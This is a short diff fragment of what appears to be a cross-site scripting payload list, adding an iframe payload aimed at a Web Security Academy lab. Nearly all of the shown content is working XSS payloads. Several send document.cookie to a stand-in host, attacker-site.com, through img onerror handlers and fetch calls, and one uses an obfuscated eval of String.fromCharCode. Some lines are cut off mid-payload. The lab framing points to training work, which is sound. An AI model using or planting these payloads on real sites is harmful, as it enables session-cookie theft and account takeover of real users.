@@ -25,6 +25,8 @@ fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(doc
 
 <img src=x onerror="fetch('https://attacker-site.com/?c='+document.cookie)">
 
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
 <script>eval(String.fromCharCode(102,101,116,99,104,40,39,104...));</script>
 
 <script>(()=>{fetch('https://attacker-site.com/?c='+document.cookie)})()</script>
